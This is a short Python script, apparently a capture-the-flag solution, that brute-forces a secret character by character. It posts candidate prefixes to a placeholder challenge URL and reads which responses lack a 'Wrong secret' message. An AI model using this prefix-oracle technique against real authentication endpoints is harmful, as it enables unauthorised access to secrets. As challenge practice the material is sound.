"""
MRX - APRIL 2026.
"""
import requests
import string

url = "http://url-of-the.chall/secret" # fake url.
charset = string.ascii_lowercase + "_"

secret = ""

for pos in range(20):
    for c in charset:
        test = secret + c
        resp = requests.post(url, data={"secret": test})
        
        # Different response means correct prefix.
        if "Wrong secret" not in resp.text:
            secret += c
            print(f"Current secret: {secret}")
            break
            
    if "prophecy" in resp.text.lower():
        break

print(f"Final secret: {secret}")
